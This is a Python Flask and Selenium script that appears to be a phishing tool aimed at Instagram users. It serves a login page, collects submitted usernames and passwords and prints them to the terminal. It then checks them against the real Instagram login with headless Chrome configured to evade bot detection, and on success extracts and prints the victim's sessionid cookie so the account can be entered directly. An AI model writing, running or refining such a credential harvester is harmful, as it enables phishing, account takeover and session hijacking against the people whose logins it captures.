import os
import time
import random
from flask import Flask, request, render_template, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
# Use this line
import undetected_chromedriver as uc

app = Flask(__name__)

# --- Instagram Login Checker Function (IMPROVED & MORE RELIABLE) ---
def check_instagram_login(username, password):
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # Hide the browser
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--log-level=3")  # Reduce logs
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")  # Add this line
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])  # And this
    chrome_options.add_experimental_option('useAutomationExtension', False)  # And this

    # Initialize the driver
    try:
        # We are using 'uc' which is undetected-chromedriver
        driver = uc.Chrome(version_main=None, options=chrome_options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")  # Hide automation flag with JS
    except Exception as e:
        print(f"Error initializing WebDriver: {e}")
        return {"status": 0, "session_id": None, "error": "WebDriver setup failed."}

    login_url = "https://www.instagram.com/accounts/login/"
    driver.get(login_url)

    try:
        # Find username and password fields - use WebDriverWait, it's more reliable
        wait = WebDriverWait(driver, 15)  # Wait for up to 15 seconds
        
        # Wait for the username field to load first
        username_field = wait.until(EC.presence_of_element_located((By.NAME, 'username')))
        
        # Add a small delay to seem more human
        time.sleep(random.uniform(1.0, 2.5))
        
        password_field = driver.find_element(By.NAME, 'password')
        
        username_field.send_keys(username)
        time.sleep(random.uniform(0.5, 1.5))  # Human-like typing delay
        password_field.send_keys(password)
        time.sleep(random.uniform(0.5, 1.5))
        
        password_field.submit()
        
        # Wait for login to complete - use WebDriverWait to check
        print("Login submitted, waiting for redirect...")
        
        # Wait up to 10 seconds for an element that only appears after login
        # This checks if the URL has also changed
        wait.until(lambda d: "accounts/login" not in d.current_url or d.find_element(By.XPATH, "//button[text()='Not Now']"))
        
        is_logged_in = False
        try:
            # Look for the "Not Now" button (Save your login info popup)
            wait.until(EC.element_to_be_clickable((By.XPATH, "//button[text()='Not Now']")))
            is_logged_in = True
        except:
            try:
                # Look for the Home icon (in the nav)
                wait.until(EC.presence_of_element_located((By.XPATH, "//*[local-name()='svg' and @aria-label='Home']")))
                is_logged_in = True
            except:
                try:
                    # Look for the Profile picture (top right corner)
                    wait.until(EC.presence_of_element_located((By.XPATH, "//img[@data-testid='user-avatar']")))
                    is_logged_in = True
                except:
                    # If an error message appeared, then login failed
                    try:
                        driver.find_element(By.ID, 'slfErrorAlert')
                        is_logged_in = False  # Explicitly set to false
                    except:
                        pass  # Nothing found, assume login failed

        if is_logged_in:
            # Login successful
            cookies = driver.get_cookies()
            session_id = None
            for cookie in cookies:
                if cookie['name'] == 'sessionid':
                    session_id = cookie['value']
                    break
            driver.quit()
            return {"status": 1, "session_id": session_id, "error": None}
        else:
            # Login failed
            error_message = "Invalid credentials or blocked by Instagram."
            try:
                error_element = driver.find_element(By.ID, 'slfErrorAlert')
                if error_element.is_displayed():
                    error_message = error_element.text
            except:
                pass
            driver.quit()
            return {"status": 0, "session_id": None, "error": error_message}

    except Exception as e:
        print(f"An exception occurred: {e}")
        driver.quit()
        return {"status": 0, "session_id": None, "error": f"An error occurred: {e}"}

# Flask Routes
@app.route('/')
def index():
    """ This route will show you the login page on localhost. """
    return render_template('login.html')

@app.route('/check', methods=['POST'])
def check_credentials():
    """ This route will get data from the form, print it to the terminal, and then call the check_instagram_login function. """
    username = request.form.get('username')
    password = request.form.get('password')

    # --- Step 1: Print data to terminal ---
    print("\n" + "="*30)
    print("New Credentials Received:")
    print(f"Username: {username}")
    print(f"Password: {password}")
    print("="*30 + "\n")

    # --- Step 2: Check login on real Instagram ---
    print("Checking on Instagram... Please wait.")
    result = check_instagram_login(username, password)

    # --- Step 3: Print result to terminal ---
    print("\n" + "="*30)
    print("Instagram Login Result:")
    if result['status'] == 1:
        print("Status: 1 (SUCCESS - This data is correct)")
        if result['session_id']:
            print(f"Session ID: {result['session_id']}")
            print("You can use this session ID to go directly to Instagram.")
    else:
        print("Status: 0 (FAILED - This data is incorrect)")
        if result['error']:
            print(f"Reason: {result['error']}")
    print("="*30 + "\n")

    # --- Step 4: Send response to user (optional) ---
    if result['status'] == 1:
        response_message = "Login successful! Check your terminal for details."
    else:
        response_message = "Login failed. The username or password you entered is incorrect."
    return jsonify({
        "message": response_message,
        "status": result['status']
    })

# --- Main block to run the server ---
if __name__ == '__main__':
    print("Tool starting...")
    print("Open http://127.0.0.1:5000 in your browser to see the login page.")
    app.run(host='0.0.0.0', port=5000, debug=True)
